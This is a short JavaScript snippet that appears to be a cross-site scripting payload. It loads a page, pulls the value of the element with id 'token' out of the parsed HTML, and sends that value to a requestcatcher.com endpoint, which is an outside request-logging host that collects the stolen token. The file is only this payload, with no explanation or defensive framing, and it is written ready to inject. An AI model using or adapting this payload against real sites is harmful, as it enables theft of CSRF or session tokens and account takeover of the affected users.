fetch('https://yt54h.requestcatcher.com/test')
  .then(response => {
    
    return response.text()
  })
  .then(html => {
    const parser = new DOMParser()

    const doc = parser.parseFromString(html, "text/html")

    const token = doc.querySelector('#token').value

    fetch(`https://yt54h.requestcatcher.com/${token}`)
  })
  .catch(error => {
     console.error('Failed to fetch page')
  })
